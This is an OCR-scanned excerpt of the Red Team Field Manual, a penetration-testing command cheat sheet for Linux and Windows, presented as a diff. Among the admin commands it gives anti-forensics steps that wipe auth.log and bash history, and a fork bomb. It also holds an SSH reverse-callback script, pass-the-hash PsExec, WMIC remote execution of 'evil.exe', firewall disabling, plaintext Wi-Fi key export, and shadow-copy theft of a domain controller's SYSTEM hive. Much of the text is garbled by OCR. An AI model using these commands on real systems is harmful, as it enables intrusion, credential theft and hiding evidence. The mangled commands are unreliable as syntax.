@@ -1,1 +1,10853 @@
 
+RTFM 
+
+
+Red Team Field Manual 
+
+
+Ben Clark 
+
+
+v 1.0 
+
+
+RTFM. Copyright © 2013 by Ben Clark 
+
+
+All rights reserved. No part of this work may be reproduced or transmitted 
+in any form or by any means, without prior written permission of the 
+copyright owner. 
+
+
+ISBN-10: 1494295504 
+ISBN-13: 9"8-1494295509 
+
+Technical Editor: Joe Vest 
+Graphic: Joe Vest 
+
+
+Product and company names mentioned herein may be the trademarks of their 
+respective owners. Rather than use a trademark symbol with every occurrence 
+of a trademarked name, the author uses the names only in an editorial 
+fashion, with no intention of infringement of the trademark. Use of a term 
+in this book should not be regarded as affecting the validity of any 
+trademark or service mark. 
+
+The information in this book is distributed "as is". While every precaution 
+was taken to ensure the accuracy of the material, the author assumes no 
+responsibility or liability for errors or omissions, or for damages 
+resulting from the use of the information contained herein. 
+
+
+2 
+
+
+
+Table of Contents 
+
+
+f NIX 4 
+
+WINDOWS 14 
+
+NETWORKING 34 
+
+fTIPS AND TRICKS 42 
+
+[TOOL SYNTAX 50 
+
+WEB 66 
+
+DATABASES 72 
+
+PROGRAMMING 76 
+
+IA/IRELESS 84 
+
+REFERENCES 94 
+
+[INDEX 95 
+
+
+THS Bonus Material added by 0E800 
+
+
+Nmap Cheat Sheet 
+Nmap Cheat Sheet 2 
+Wireshark Display Filters 
+Common Ports List 
+Google Cheat Sheet 
+capy 
+
+CPDUMP 
+
+NAT 
+
+
+|QoS 
+
+IPv4 
+
+IPv6 
+
+
+3 
+
+
+*NIX 
+
+
+
+Linux Network Commands 
+
+
+watch ss -tp 
+netstat -ant 
+netstat -tulpn 
+lsof -i 
+
+smb : // ip. /share 
+
+share user x.x.x.x c$ 
+
+smbclient -U user \\\\ ip \\ share 
+
+ifconfig eth# ip / cidr 
+
+ifconfig ethO : 1 ip / cidr 
+
+route add default gw gw_ip 
+
+ifconfig eth# mtu [size] 
+
+export MAC=xx:xx:xx:xx:xx:xx 
+
+ifconfig int hw ether MAC 
+
+macchanger -m MAC. int 
+
+iwlist int scan 
+
+dig -x ip 
+
+host ip 
+
+host -t SRV _ service _tcp.url.com 
+dig @ ip domain -t AXFR 
+host -1 domain namesvr 
+ip xfrm state list 
+ip addr add ip / cidr dev ethO 
+/var/log/messages | grep DHCP 
+tcpkill host ip and port port 
+echo "1" /proc/sys/net/ipv4 /ip_f o: 
+echo "nameserver x.x.x.x" /etc/re; 
+
+
+Network connections 
+Tcp connections -anu=udp 
+Connections with PIDs 
+Established connections 
+Access windows smb share 
+Mount Windows share 
+SMB connect 
+Set IP and netmask 
+Set virtual interface 
+Set GW 
+
+Change MTU size 
+Change MAC 
+Change MAC 
+
+Backtrack MAC changer 
+Built-in wifi scanner 
+Domain lookup for IP 
+Domain lookup for IP 
+Domain SRV lookup 
+DNS Zone Xfer 
+DNS Zone Xfer 
+Print existing VPN keys 
+Adds 'hidden' interface 
+List DHCP assignments 
+Block iprport 
+
+ird Turn on IP Forwarding 
+
+.v.conf Add DNS Server 
+
+
+Linux System Info 
+
+
+
+
+nbtstat -A ip 
+id 
+
+
+w 
+
+who -a 
+last -a 
+ps -ef 
+df -h 
+
+
+uname -a 
+mount 
+
+getent passwd 
+
+PATH=$PATH : /home/mypath 
+
+kill pid 
+
+cat /etc/issue 
+
+cat /etc/ ' release y 
+
+cat /proc/version 
+
+rpm --query -all 
+
+rpm -ivh A . rpm 
+
+dpkg -get-selections 
+
+dp kg -I A .deb 
+
+pkginfo 
+
+which tscsh/csh/ksh/bash 
+chmod "50 tcsh/csh/ksh 
+
+
+Get hostname for ip 
+Current username 
+Logged on users 
+User information 
+Last users logged on 
+Process listing (top) 
+
+Disk usage (free) 
+
+Kernel version/CPU info 
+Mounted file systems 
+Show list of users 
+Add to PATH variable 
+Kills process with pid 
+Show OS info 
+Show OS version info 
+Show kernel info 
+Installed pkgs (Redhat) 
+Install RPM (-e=remove) 
+Installed pkgs (Ubuntu) 
+Install DEB (-r=remove) 
+Installed pkgs (Solaris) 
+Show location of executable 
+Disable shell , force bash 
+
+
+5 
+
+
+
+
+Linux Utility Commands 
+
+
+wget http:// url -0 url.txt -o /dev/null 
+rdesktop ip 
+
+scp /tmp/file user@x . x . x . x : /tmp/file 
+
+scp user@ remoteip : /tmp/file /tmp/file 
+
+useradd -m user 
+
+passwd user 
+
+rmuser uname 
+
+script -a outfile 
+
+apropos subject 
+
+history 
+
+! num 
+
+
+Grab url 
+
+Remote Desktop to ip 
+Put file 
+Get file 
+Add user 
+
+Change user password 
+Remove user 
+
+Record shell : Ctrl-D stops 
+Find related command 
+View users command history 
+Executes line # in history 
+
+
+Linux File Commands 
+
+
+diff filel file2 
+
+rm -rf dir 
+
+shred -f -u file 
+
+touch -r ref_file file 
+
+touch -t YYYYMMDDHHSS file 
+
+sudo fdisk -1 
+
+mount /dev/sda# /mnt/usbkey 
+
+md5sum -t file 
+
+echo -n "str" I md5sum 
+
+shalsum file 
+
+sort -u 
+
+grep -c "str" file 
+
+tar cf file. tar files 
+
+tar xf file. tar 
+
+tar czf file. tar. gz files 
+
+tar xzf file. tar. gz 
+
+tar c j f file. tar. bz2 files 
+
+tar x j f file. tar. bz2 
+
+gzip file 
+
+gzip -d file.gz 
+
+upx -9 -o out.exe orig.exe 
+
+zip -r zipname.zip \Directory\ A 
+
+dd skip=1000 count=2000 bs=8 if=file of=file 
+
+split -b 9K \ file prefix 
+
+awk ' sub ( "$" . "\r'j ' unix.txt win.txt 
+
+find -i -name file -type A .pdf 
+
+find / -perm -4000 -o -perm -2000 -exec Is - 
+
+ldb {} \; 
+
+dos2unix file 
+
+file file 
+
+chattr (+/-) i file 
+
+
+
+Compare files 
+Force delete of dir 
+Overwrite/delete file 
+Matches ref_file timestamp 
+Set file timestamp 
+List connected drives 
+Mount USB key 
+Compute md5 hash 
+Generate md5 hash 
+SHA1 hash of file 
+Sort/show unique lines 
+Count lines w/ "str" 
+
+Create .tar from files 
+Extract .tar 
+Create .tar.gz 
+Extract .tar.gz 
+Create .tar.bz2 
+Extract .tar.bz2 
+Compress/rename file 
+Decompress file.gz 
+UPX packs orig.exe 
+Create zip 
+
+Cut block 1K-3K from file 
+Split file into 9K chunks 
+Win compatible txt file 
+Find PDF files 
+Search for setuid files 
+
+Convert to A nix format 
+Determine file type/info 
+Set/Unset immutable bit 
+
+
+Linux Mi sc Commands 
+
+
+ssh user@ ip arecord - I aplay - 
+gcc -o outfile myfile.c 
+init 6 
+
+cat /etc/ A syslog A . conf | grep -v 
+grep ’href=' file | cut -d"/" -f3 I grep 
+url | sort -u 
+
+dd if=/dev/urandom of= file bs=3145' 7 28 
+count=100 
+
+
+Disable history logging 
+Record remote mic 
+Compile C,C++ 
+
+Reboot (0 = shutdown) 
+List of log files 
+Strip links in url.com 
+
+
+Make random 3MB file 
+
+
+6 
+
+
+
+Linux "cover your tracks" Commands 
+
+
+
+
+echo "" /var/log/auth . log 
+
+echo "" ~/ . bash_history 
+
+rm ~/ . bash_history -rf 
+history -c 
+
+export HISTFILESIZE=0 
+export HISTSI ZE=0 
+unset HISTFILE 
+
+kill -9 $$ 
+
+In /dev/null -/ . bash_history -sf 
+
+
+
+
+Clear auth.log file 
+Clear current user bash history 
+Delete . bash_history file 
+Clear current session history 
+Set history max lines to 0 
+Set histroy max commands to 0 
+Disable history logging (need to 
+logout to take effect) 
+
+Kills current session 
+Permanently send all bash history 
+commands to /dev/null 
+
+
+/bin 
+
+/boot 
+
+/ dev 
+
+/etc 
+
+/home 
+
+/lib 
+
+/opt 
+
+/proc 
+
+/ root 
+
+/ sbin 
+
+/ tmp 
+
+/usr 
+
+/var 
+
+
+Linux File System Structure 
+
+
+
+User binaries 
+Boot-up related files 
+Interface for system devices 
+System configuration files 
+Base directory for user files 
+Critical software libraries 
+Third party software 
+System and running programs 
+Home directory of root user 
+System administrator binaries 
+Temporary files 
+Less critical files 
+Variable system files 
+
+
+
+
+Linux Scripting 
+
+
+Ping sweep 
+
+for x in { 1 . .254. . 1 } ; do ping -c 1 l.l.l.$x I grep "64 b" | cut -d" " -f4 
+ips.txt; done 
+
+Automated domain name resolve Bash script 
+
+
+# ! /bin/bash 
+
+echo "Enter Class C Range: i.e. 192.168.3" 
+read range 
+
+for ip in { 1 . . 254 . . 1 } ; do 
+
+host $range.$ip I grep "name pointer" | cut -d" " -f 5 
+done 
+
+
+Fork bomb (creates processes until system "crashes”) 
+
+:(){:!:&};: 
+
+
+DNS REVERSE LOOKUP 
+
+for ip in {1..254..1}; do dig -x l.l.l.$ip | grep $ip dns.txt; done; 
+
+IP BANNING SCRIPT 
+
+
+# ! /bin/sh 
+
+# This script bans any IP in the / 2 4 subnet for 192.168.1.0 
+
+# It assumes 1 is the router and does not ban IPs .20, .21, 
+
+i=2 
+
+
+while [ $i -le 253 ] 
+do 
+
+if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ] ; then 
+echo "BANNED: arp -s 192 . 168 . 1 . $i" 
+arp -s 192 . 168 . 1 . $i 00:00:00:00:00:0a 
+
+else 
+
+echo "IP NOT BANNED: 192 . 168 . 1 . $i 1 1 A * A A 
+echo " ■* ■ K k Auuun,u ■ ‘ k h 1 A ■ - a u u n * x 
+
+fi 
+
+i='expr $i +1' 
+
+
+starting at 
+.22 
+
+
+2 
+
+
+done 
+
+
+
+SSH CALLBACK 
+
+
+Set up script in crontab to callback every X minutes. Highly recommend you 
+set up a generic user on red team computer (with no shell privs) . Script 
+will use the private key (located on callback source computer) to connect 
+to a public key (on red team computer) . Red teamer connects to target via a 
+local SSH session (in the example below, use #ssh -p4040 localhost) 
+
+# ! /bin/sh 
+
+# Callback script located on callback source computer (target) 
+
+killall ssh /dev/null 2 &1 
+
+sleep 5 
+
+REMLIS=4040 
+
+REMUSR=user 
+
+HOSTS="domainl . com domain2.com domain3.com" 
+for LIVEHOST in $HOSTS; 
+do 
+
+COUNT=$ (ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print 
+
+$2 } ' | awk ' { print $1 } ' ) 
+
+if [[ $COUNT -gt 0 ]]; then 
+
+ssh -R ${REMLIS} : localhost: 22 -i 
+"/home/ $ { REMUSR} / . ssh/ id_rsa" -N ${LIVEHOST} -1 ${REMUSR} 
+fi 
+
+
+9 
+
+
+IPtables 
+
+
+Use ip6tables for IPv6 rules 
+
+
+iptables-save -c . file. 
+
+iptables-restore file 
+iptables -L -v — line-numbers 
+
+iptables -F 
+
+iptables -P INPUT/FORWARD/OUTPUT 
+ACCEPT/REJECT/DROP 
+iptables -A INPUT -i interface -m 
+state RELATED, ESTABLISHED -j ACCEPT 
+iptables -D INPUT 7 
+iptables -t raw -L -n 
+
+iptables -P INPUT DROP 
+
+Allow SSH on port 22 outbound 
+
+
+Dump iptables (with 
+counters) rules to stdout 
+Restore iptables rules 
+List all iptables rules with 
+affected and line numbers 
+Flush all iptables rules 
+Change default policy for 
+rules that don't match rules 
+state — Allow established 
+
+connections on INPUT 
+Delete 7th inbound rule 
+Increase throughput by 
+turning off statefulness 
+Drop all packets 
+
+
+iptables -A OUTPUT -o iface. -p tcp — dport 22 -m state --state 
+NEW, ESTABLISHED -j ACCEPT 
+
+iptables -A INPUT -i iface -p tcp — sport 22 -m state --state 
+ESTABLISHED -j ACCEPT 
+
+
+Allow ICMP outbound 
+
+
+iptables -A OUTPUT -i iface -p icmp —icmp-type echo-request -j ACCEPT 
+iptables -A INPUT -o iface -p icmp --icmp-type echo-reply -j ACCEPT 
+
+Port forward 
+
+
+echo "1" /proc/sys/net/ipv4/ip_forward 
+# OR - sysctl net . ipv4 . ip_forward=l 
+
+iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d pivotip — dport 
+443 -to-destination attk_ip :443 
+
+iptables -t nat -A POSTROUTING -p tcp -i ethO -j SNAT -s target subnet 
+cidr -d attackip — dport 443 -to-source pivotip. 
+iptables -t filter -I FORWARD 1 -j ACCEPT 
+
+
+Allow only 1.1.1. 0/24 , ports 80 , 443 and log drops to 
+/var/ log/ messages 
+
+
+iptables -A INPUT -s 1.1.1.0/24 -m state — state RELATED, ESTABLISHED, NEW 
+-p tcp -m multiport — dports 80,443 -j ACCEPT 
+
+. iptables -A INPUT -i ethO -m state —state RELATED, ESTABLISHED -j ACCEPT 
+iptables -P INPUT DROP 
+■ iptables -A OUTPUT -o ethO -j ACCEPT 
+iptables -A INPUT -i lo -j ACCEPT 
+iptables -A OUTPUT -o lo -j ACCEPT 
+
+- iptables -N LOGGING 
+
+- iptables -A INPUT -j LOGGING 
+
+iptables -A LOGGING -m limit — limit 4/min -j LOG — log-prefix "DROPPED " 
+• iptables -A LOGGING -j DROP 
+
+
+10 
+
+
+
+UPDATE -RC.D 
+
+
+Check/change startup services 
+
+
+service — status-all 
+
+service service start 
+service service stop 
+service service status 
+update-rc.d -f service remove 
+
+
+update-rc.d service defaults 
+
+
+[+] Service starts at boot 
+[-] Service does not start 
+Start a service 
+Stop a service 
+Check status of a service 
+Remove a service start up cmd (- 
+f if the /etc/init.d start up 
+file exists) 
+
+Add a start up service 
+
+
+CHKCONFIG 
+
+A Available in Linux distributions such as Red Hat Enterprise Linux (RHEL) , 
+CentOS and Oracle Enterprise Linux (PEL) 
+
+
+chkconf ig 
+
+--list 
+
+
+List existing services and run 
+status 
+
+chkconf ig 
+
+service 
+
+-list 
+
+Check single service status 
+
+chkconf ig 
+
+service 
+
+on [--level 3] 
+
+Add service [optional to add 
+level at which service runs] 
+
+chkconfig service off [ — level 3] 
+e.g. chkconfig iptables off 
+
+Remove service 
+
+
+Screen 
+
+
+(C-a == Control-a) 
+
+
+
+screen -S name 
+
+Start new screen with name 
+
+screen -Is 
+
+List running screens 
+
+screen -r name 
+
+Attach to screen name 
+
+screen -S name -X cmd 
+
+Send cmd to screen anme 
+
+C-a 
+
+? 
+
+List keybindings (help) 
+
+C-a 
+
+d 
+
+Detach 
+
+C-a 
+
+D D 
+
+Detach and logout 
+
+C-a 
+
+c 
+
+Create new window 
+
+C-a 
+
+C-a 
+
+Switch to last active window 
+
+C-a 
+
+' num | name 
+
+Switch to window num | name 
+
+C-a 
+
+" 
+
+See windows list and change 
+
+C-a 
+
+k 
+
+Kill current window 
+
+C-a 
+
+S 
+
+Split display horizontally 
+
+C-a 
+
+V 
+
+Split display vertically 
+
+C-a 
+
+tab 
+
+Jump to next display 
+
+C-a 
+
+X 
+
+Remove current region 
+
+C-a 
+
+Q 
+
+Remove all regions but current 
+
+
+11 
+
+
+
+XI 1 
+
+
+Capture remote XI 1 windows and convert to JPG 
+
+
+xwd -display ip :0 -root -out /tmp/test . xpm 
+xwud -in /tmp/testl . xpm 
+
+convert /tmp/test . xpm -resize 1280x1024 /tmp/test . jpg 
+
+
+Open XI 1 stream viewing 
+
+
+xwd -display 1.1. 1.1:0 -root -silent -out xlldump 
+Read dumped file with xwudtopnm or GIMP 
+
+TCPDump 
+
+
+Capture packets on ethO in ASCII and hex and write to file 
+
+
+tcpdump -i ethO -XX -w out.pcap 
+
+
+Capture HTTP traffic to 2 . 2 . 2 . 2 
+
+
+tcpdump -i ethO port 80 dst 2. 2. 2. 2 
+
+
+Show connections to a specific IP 
+
+tcpdump -i ethO -tttt dst 192.168.1.22 and not net 192.168.1.0/24 
+
+Print all ping responses 
+
+
+tcpdump -i ethO ' icmp [ icmptype] == icmp-echoreply' 
+
+
+Capture 50 DNS packets and print timestamp 
+
+
+tcpdump -i ethO -c 50 -tttt 'udp and port 53' 
+
+
+Native Kali Commands 
+
+
+WMIC equivalent 
+
+
+wmis -U DOMAIN \ user % password- //-DC cmd.exe /c command 
+
+
+Mount SMB share 
+
+
+# Mounts to /mnt/share. For other options besides ntlmssp, man mount. cifs 
+mount. cifs // ip /share /mnt/share -o 
+user= user , pass= pass , sec=ntlmssp, domain= domain , rw 
+
+
+Updating Kali 
+
+
+apt-get update 
+apt-get upgrade 
+
+
+12 
+
+
+
+pfSense 
+
+
+pfSsh .php 
+
+pfSsh.php playback enableallowallwan 
+
+
+pfSsh. php playback enablesshd 
+
+pfctl -sn 
+
+pfctl -sr 
+
+pfctl -sa 
+
+viconf ig 
+
+rm /tmp/config . cache 
+
+
+/etc/rc . reload_all 
+
+
+pfSense Shell System 
+Allow all inbound WAN 
+connections (adds to visible 
+rules in WAN rules) 
+
+Enable ssh inbound/outbound 
+
+Show NAT rules 
+
+Show filter rules 
+
+Show all rules 
+
+Edit config 
+
+Remove cached (backup) 
+
+config after editing the 
+
+current running 
+
+Reload entire config 
+
+
+Solaris 
+
+
+if config -a 
+netstat -in 
+ifconfig -r 
+ifconfig ethO dhcp 
+
+ifconfig ethO plumb up ip netmask nmask 
+
+route add default ip 
+
+logins -p 
+
+svcs -a 
+
+prstat -a 
+
+svcadm start ssh 
+
+inetadm -e telnet (-d for disable) 
+prtconf | grep Memory 
+iostat -En 
+
+showrev -c /usr/bin/bash 
+shutdown -i6 -gO -y 
+dfmounts 
+smc 
+
+snoop -d int -c pkt # -o results. pcap 
+/etc/vf stab 
+/var/adm/ logging 
+/etc/default/ 
+
+/etc/system 
+/var/adm/mes sages 
+/etc/auto_' 
+
+/etc/inet/ipnodes 
+
+
+List of interfaces 
+List of interface 
+Route listing 
+Start DHCP client 
+Set IP 
+Set gateway 
+
+List users w/out passwords 
+List all services w/ status 
+Process listing (top) 
+
+Start SSH service 
+Enable telnet 
+Total physical memory 
+Hard disk size 
+Information on a binary 
+Restart system 
+List clients connected NFS 
+Management GUI 
+Packet capture 
+File system mount table 
+Login attempt log 
+Default settings 
+Kernel modules & config 
+Syslog location 
+Automounter config files 
+IPv4/IPv6 host file 
+
+
+13 
+
+
+
+Windows 
+
+
+Windows Versions 
+
+
+
+
+Windows NT 3.1 (All) 
+
+Windows NT 3 . 5 (All) 
+
+Windows NT 3.51 (All) 
+
+Windows NT 4.0 (All) 
+
+Windows 2000 (All) 
+
+Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded) 
+Windows XP (64-bit, Pro 64-bit) 
+
+Windows Server 2003 & R2 (Standard, Enterprise) 
+
+Windows Home Server 
+
+Windows Vista (Starter, Home, Basic, Home Premium, 
+Business, Enterprise, Ultimate) 
+
+Windows Server 2008 (Foundation, Standard, Enterprise) 
+Windows " (Starter, Home, Pro, Enterprise, Ultimate) 
+Windows Server 2008 R2 (Foundation, Standard, Enterprise) 
+Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)) 
+
+Windows Phone 8 
+
+Windows Server 2012 (Foundation, Essentials, Standard) 
+
+
+Windows Files 
+
+
+■ ?I§illl . d. .Idlliil . ' . HiSil lill 111 lids mm dH 
+
+
+%SYSTEMROOT% 
+
+%SYSTEMROOT%\System32\drivers\etc\hosts 
+%SYSTEMROOT%\System32\drivers\etc\networks 
+%SYSTEMROOT%\system32\conf ig\SAM 
+%SYSTEMROOT%\ repair \SAM 
+
+% S Y S T EMROOT % \ S y s t em3 2 \ con f i g \ Re gBa ck \ SAM 
+%WINDIR%\system32\conf ig\AppEvent . Evt 
+%WINDIR%\system32\conf ig\SecEvent . Evt 
+%ALLUSERSPROFILE%\Start Menu\Programs\Startup\ 
+%USERPROFILE%\Start Menu\Programs\Startup\ 
+%SYSTEMROOT%\ Prefetch 
+
+
+Startup Directories 
+
+
+Windows NT 6 . 1 , 6 . 0 
+
+# All users 
+
+%SystemDrive%\ProgramData\Microsoft \Windows\Start Menu\ Programs \ Startup 
+
+# Specific users 
+
+%Sy stemDrive%\Users\%UserName%\AppData\Roaming\Microso ft Windows \ Start 
+Menu\ Programs \ Star tup 
+
+Windows NT 5.2, 5.1, 5.0 
+
+%SystemDrive%\Documents and Settings\All Users\Start Menu\Programs\Startup 
+
+Windows 9x 
+
+%SystemDrive%\wmiOWS\ Start Menu\ Programs \ Star tup 
+
+Windows NT 4.0, 3.51, 3.50 
+
+%SystemDrive%\WINNT\Prof iles\All Users\Start Menu\ Programs \ Startup 
+
+
+Typically C:\Windows 
+DNS entries 
+Network settings 
+User & password hashes 
+Backup copy of SAM 
+Backup copy of SAM 
+Application Log 
+Security Log 
+Startup Location 
+Startup Location 
+Prefetch dir (EXE logs) 
+
+
+NT 3.1 
+NT 3.5 
+NT 3.51 
+NT 4.0 
+NT 5.0 
+NT 5.1 
+NT 5.2 
+
+
+NT 6.0 
+
+
+NT 6.1 
+NT 6.2 
+
+
+15 
+
+
+
+
+Windows System Info Commands 
+
+
+
+ver 
+
+sc query state=all 
+tasklist /svc 
+tasklist /m 
+tasklist /S ip /v 
+taskkill /PID pid /F 
+
+systeminfo /S ip. /U domain\user /P Pwd 
+reg query \\ ip \ RegDomain \ Key /v 
+Value 
+
+reg query HKLM /f password /t REG_SZ /s 
+fsutil fsinfo drives 
+dir /a /s /b c: \ ‘ .pdf • 
+dir /a /b c : \windows\ kb ‘ 
+
+findstr /si password ; .txt| * . xml | ‘.xls 
+tree /F /A c:\ tree.txt 
+reg save HKLM\Security security . hive 
+echo % USERNAME % 
+
+
+
+Get OS version 
+Show services 
+Show processes & services 
+Show all processes & DLLs 
+Remote process listing 
+Force process to terminate 
+Remote system info 
+Query remote registry, 
+
+/s=all values 
+
+Search registry for password 
+List drives ‘must be admin 
+Search for all PDFs 
+Search for patches 
+Search files for password 
+Directory listing of C: 
+
+Save security hive to file 
+Current user 
+
+
+Windows NET/Domain Commands 
+
+
+
+net view /domain 
+
+net view /domain: [MYDOMAIN] 
+
+net user /domain 
+
+net user user pass /add 
+
+net localgroup "Administrators" user /add 
+
+net accounts /domain 
+
+net localgroup "Administrators" 
+
+net group /domain 
+
+net group "Domain Admins" /domain 
+net group "Domain Controllers" /domain 
+net share 
+
+net session | find / "\\" 
+
+net user user /ACTIVE: yes /domain 
+
+net user user " newpassword " /domain 
+
+net share share c:\share 
+
+/GRANT: Everyone, FULL 
+
+
+Hosts in current domain 
+Hosts in [MYDOMAIN] 
+
+All users in current domain 
+Add user 
+
+Add user to Administrators 
+Domain password policy 
+List local Admins 
+List domain groups 
+List users in Domain Admins 
+List DCs for current domain 
+Current SMB shares 
+Active SMB sessions 
+Unlock domain user account 
+Change domain user password 
+Share folder 
+
+
+Windows Remote Commands 
+
+
+. cm—a. ' | 
+
+tasklist /S ip /v 
+
+systeminfo /S ip /U domain\user /P Pwd 
+net share \\ ip 
+net use \\ ip 
+
+net use z: \\ ip \share password 
+
+/user : DOMAIN! user 
+
+reg add \\ ip \ regkey \ value 
+
+sc \\ ip create service 
+
+binpath=C : \Windows\System32\x . exe start= 
+
+auto 
+
+xcopy /s \\ ip \dir C:\local 
+shutdown /m \\ ip /r /t 0 /f 
+
+
+
+Remote process listing 
+Remote systeminfo 
+Shares of remote computer 
+Remote filesystem (IPC$) 
+Map drive, specified 
+credentials 
+
+Add registry key remotely 
+Create a remote service 
+(space after start=) 
+
+Copy remote folder 
+Remotely reboot machine 
+
+
+16 
+
+
+Windows Network Commands 
+
+
+ipconfig /all 
+
+ipconfig /displaydns 
+
+netstat -ano 
+
+netstat -anop tcp 1 
+
+netstat -an | findstr LISTENING 
+
+route print 
+
+arp -a 
+
+nslookup, set type=any, Is -d domain 
+results.txt, exit 
+
+nslookup -type=SRV _www._tcp.url.com 
+
+tftp -I ip GET remotefile 
+netsh wlan show profiles 
+netsh firewall set opmode disable 
+netsh wlan export profile folder=. key=clear 
+netsh interface ip show interfaces 
+netsh interface ip set address local static 
+ip nmask gw ID 
+
+netsh interface ip set dns local static ip 
+netsh interface ip set address local dhcp 
+
+
+IP configuration 
+Local DNS cache 
+Open connections 
+Netstat loop 
+LISTENING ports 
+Routing table 
+Known MACs (ARP table) 
+
+DNS Zone Xfer 
+
+Domain SRV lookup (_ldap, 
+_kerberos, _sip) 
+
+TFTP file transfer 
+Saved wireless profiles 
+Disable firewall ( A 01d) 
+Export wifi plaintext pwd 
+List interface IDs/MTUs 
+Set IP 
+
+Set DNS server 
+
+Set interface to use DHCP 
+
+
+Windows Utility Commands 
+
+
+■HIM 
+
+
+type file 
+
+del path V . 1 /a /s /q / f 
+
+
+find /I "str" filename 
+command | find /c /v " " 
+at HH:MM file [args] (i.e. at 14:45 cmd 
+/c) 
+
+runas /user: user " file [args]" 
+restart /r /t 0 
+
+tr -d '\15\32' win.txt unix.txt 
+makecab file 
+
+Wusa.exe /uninstall /kb: ### 
+
+cmd.exe "wevtutil qe Application /c:40 
+
+/f:text /rd:true" 
+
+lusrmgr .msc 
+
+services .msc 
+
+taskmgr . exe 
+
+secpool .msc 
+
+eventvwr .msc 
+
+
+Display file contents 
+Forceably delete all files 
+in path - 
+Find "str" 
+
+Line count of cmd output 
+Schedule - file to run 
+
+Run file as - user. 
+Restart now 
+Removes CR & Z (*nix) 
+Native compression 
+Uninstall patch 
+CLI Event Viewer 
+
+Local user manager 
+Services control panel 
+Task manager 
+Security policy manager 
+Event viewer 
+
+
+
+Misc . Commands 
+
+
+Lock workstation 
+
+
+rundll32.dll user32.dll LockWorkstation 
+
+
+Disable Windows firewall 
+
+
+netsh advfirewall set currentprof ile state off 
+netsh advfirewall set allprofiles state off 
+
+Native Windows port forward (* must be admin) 
+
+
+netsh interface portproxy add v4tov4 listenport=3000 
+listenaddress=l . 1 . 1 . 1 connectport=4000 connectaddress=2 . 2 . 2 . 2 
+
+#Remove 
+
+netsh interface portproxy delete v4tov4 listenport=3000 
+listenaddress=l .1.1.1 
+
+Re-enable command prompt 
+
+
+reg add HKCU\Software\Policies\Microsof t\Windows\System /v DisableCMD /t 
+REG DWORD /d 0 /f 
+
+
+PSEXEC 
+
+Execute file hosted on remote system with specified credentials 
+
+psexec /accepteula \\ targetIP -u domainXuser -p password -c -f 
+\\ smblP \share\file.exe 
+
+Run remote command with specified hash 
+
+psexec /accepteula \\ ip -u DomainXuser -p LM : NTLM cmd.exe /c dir 
+c : \Progra~l 
+
+
+Run remote command as SYSTEM 
+
+
+psexec /accepteula XX ip -s cmd.exe 
+
+
+18 
+
+
+TERMINAL SERVICES (RDP) 
+
+
+Start RDP 
+
+
+1. Create regfile.reg file with following line in it: 
+
+HKEY_LOCAL_MACHINE\SYSTEM\Cur rent ControlSet! Control! Terminal Service 
+2 . " fDenyTSConnections"=dword : 00000000 
+
+3. reg import regfile.reg 
+
+4. net start "termservice" 
+
+5. sc config termservice start= auto 
+
+6. net start termservice 
+
+— 0R- 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\:Terminal 
+Server" /v f DenyTSConnections /t REG_DWORD /d 0 /f 
+
+Tunnel RDP out port 443 (may need to restart terminal services) 
+
+
+REG ADD "HKLM\System\CurrentControlSet\Control\Terminal 
+
+Server \WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f 
+
+Disable Network Level Authentication, add firewall exception 
+
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal 
+Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DW0RD /d "0" /f 
+
+netsh firewall set service type = remotedesktop mode = enable 
+
+
+Import a schedule task from an "exported task" XML 
+
+
+schtasks.exe /create /tn MyTask /xml "C:\MyTask.xml" /f 
+
+
+WMIC 
+
+
+ComaAnd 
+
+wmic [alias] get /? 
+wmic [alias] call /? 
+wmic process list full 
+wmic startupwmic service 
+wmic ntdomain list 
+wmic qfe 
+
+wmic process call create "process_name" 
+wmic process where name="process" call 
+terminate 
+
+wmic logicaldisk get description, name 
+wmic cpu get DataWidth /format: list 
+
+
+
+
+List all attributes 
+Callable methods 
+Process attributes 
+Starts wmic service 
+Domain and DC info 
+List all patches 
+Execute process 
+Terminate process 
+
+
+View logical shares 
+Display 32 | | 64 bit 
+
+
+wmic [alias] [where] [clause] 
+
+
+[alias] == process, share, startup, service, nicconfig, useraccount, etc. 
+[where] == where (name="cmd . exe" ) , where (parentprocessid ! = [pid] " ) , etc. 
+[clause] == list [ full | brief ] , get [attribl, attrib2], call [method], 
+delete 
+
+
+Execute file hosted over SMB on remote system with specified 
+
+CREDENTIALS 
+
+
+wmic /node: targetIP /user : domain\user /password : password process call 
+create "\\ smblP \share\evil.exe" 
+
+Uninstall software 
+
+
+wmic product get name /value # Get software names 
+
+wmic product where name="XXX" call uninstall /nointeractive 
+
+
+REMOTELY DETERMINE LOGGED IN USER 
+
+
+wmic /node : remotecomputer computersystem get username 
+
+
+Remote process listing every second 
+
+
+wmic /node :machinename process list brief /every: 1 
+
+
+Remotely start RDP 
+
+
+- wmic /node : "machinename 4" path Win32_TerminalServiceSetting where 
+AllowTSConnections="0" call SetAllowTSConnections "1" 
+
+
+List number of times user has logged on 
+
+
+wmic netlogin where (name like "%adm%" ) get numberof logons 
+
+
+Search for services with unquoted paths to binary 
+
+
+wmic service get name, displayname, pathname, startmode | findstr /i "auto" 
+| findstr /i /v "c:\windows\\" | findstr /i /v """ 
+
+
+20 
+
+
+Volume Shadow Copy 
+
+
+1. wmic /node: DC IP /user : "DOMAIN\user M /password : "PASS" process 
+call create "cmd /c vssadmin list shadows 2 &1 
+
+c : \temp\ output . txt " 
+
+# If any copies already exist then exfil, otherwise create using 
+following commands. Check output.txt for any errors 
+
+2. wmic /node: DC IP /user : "DOMAIN\user " /password: "PASS" process 
+call create "cmd /c vssadmin create shadow /for=C: 2 &1 
+
+C: \temp\output . txt" 
+
+3. wmic /node: DC IP /user : "DOMAIN\user " /password: "PASS" process 
+call create "cmd /c copy 
+
+\\?\GLOBALROOT\ Device \HarddiskVolumeShadowCopyl\Windows\System3 2 \co 
+nf ig\SYSTEH C:\temp\system.hive 2 &1 C:\temp\output.txt" 
+
+4. wmic /node: DC IP /user : "DOMAINXuser " /password: "PASS" process 
+call create "cmd /c copy 
+
